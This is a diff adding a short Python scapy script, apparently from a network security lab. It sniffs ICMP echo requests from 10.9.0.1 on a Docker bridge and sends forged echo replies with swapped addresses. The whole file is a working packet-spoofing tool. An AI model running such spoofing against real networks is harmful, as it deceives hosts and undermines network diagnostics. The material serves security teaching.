@@ -1,0 +1,16 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+print("SNIFF_SPOOFING_PACKETS.........")
+def handle_packet(packet):
+    if packet.haslayer(ICMP) and packet[IP].src == '10.9.0.1':
+        spoofed_packet = IP(src=packet[IP].dst, dst=packet[IP].src)/ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)/b'Response'
+        #sending the spoofed packet
+        send(spoofed_packet, verbose=0)
+        # Print a message indicating a spoofed packet was sent
+        print(f"Sent spoofed packet from {packet[IP].dst} to {packet[IP].src}")
+
+# Start sniffing on the specified network interface for ICMP packets that originate from the attacker's IP
+# For each sniffed packet, the handle_packet function will be called
+sniff(iface='br-9d1278ac422c', filter='icmp and src 10.9.0.1', prn=handle_packet)
+
